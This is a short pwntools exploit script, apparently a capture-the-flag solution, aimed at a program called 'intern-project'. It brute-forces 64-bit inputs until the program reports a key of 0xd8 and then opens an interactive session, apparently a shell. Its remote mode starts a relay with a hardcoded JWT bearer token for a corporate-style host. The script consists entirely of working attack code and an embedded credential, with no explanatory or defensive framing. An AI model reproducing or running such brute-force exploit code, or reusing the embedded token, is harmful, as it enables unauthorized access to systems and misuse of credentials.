from pwn import *
PROGNAME   = "src/intern-project"

for i in range(0, 0x10000):
    if args.REMOTE:
        p = process(["./cli-relay", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFiQGdlZWdsZS5vcmciLCJzZXJ2aWNlIjoidWJlcnByb3h5QHNlcnZpY2VzLmdlZWdsZS5vcmciLCJleHAiOjE1NzQ1ODE3NjR9.Q4IVZ28t9s73-E7Lwr42GsbpXi4bqJF9MpVTkKJrllU", "intern-project.corp.geegle.org"])
    else:
        p = process(PROGNAME)
    p.sendlineafter(": ", p64(i))

    p.recvuntil("Key is 0x", timeout=30)
    key = int(p.recvline(), 16)

    if key == 0xd8:
        p.interactive()
        break
    else:
        print "Failed key is " + hex(key)
    p.close()

